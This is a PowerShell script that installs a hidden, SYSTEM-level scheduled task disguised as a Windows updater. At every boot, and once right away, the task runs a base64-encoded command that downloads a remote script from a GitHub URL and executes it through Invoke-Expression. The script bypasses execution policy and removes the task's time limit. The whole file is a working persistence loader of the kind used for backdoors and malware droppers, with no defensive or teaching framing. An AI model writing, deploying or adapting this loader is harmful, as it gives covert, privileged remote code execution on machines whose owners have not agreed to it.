$TaskName = "WindowsEnviromentUpdater"
$PayloadUrl = "https://raw.githubusercontent.com/joault/powershell/main/Payload.ps1"

# The inner command: downloads and executes the latest payload from GitHub
$InnerCommand = @"
`$ProgressPreference = 'SilentlyContinue'
Invoke-Expression (Invoke-WebRequest '$PayloadUrl' -UseBasicParsing).Content
"@

# Encode it
$InnerBytes = [System.Text.Encoding]::Unicode.GetBytes($InnerCommand)
$InnerBase64 = [Convert]::ToBase64String($InnerBytes)

# Task action: runs PowerShell that fetches your payload
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand $InnerBase64"

$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

# Added -ExecutionTimeLimit ([TimeSpan]::Zero) to remove the 3-day timeout
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Compatibility Win8 -Hidden -ExecutionTimeLimit ([TimeSpan]::Zero)

$Trigger = New-ScheduledTaskTrigger -AtStartup

# Remove old version if exists
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue

# Register the persistent task
Register-ScheduledTask -TaskName $TaskName -Action $Action -Principal $Principal -Settings $Settings -Trigger $Trigger -Force

# Run it immediately too
Start-ScheduledTask -TaskName $TaskName
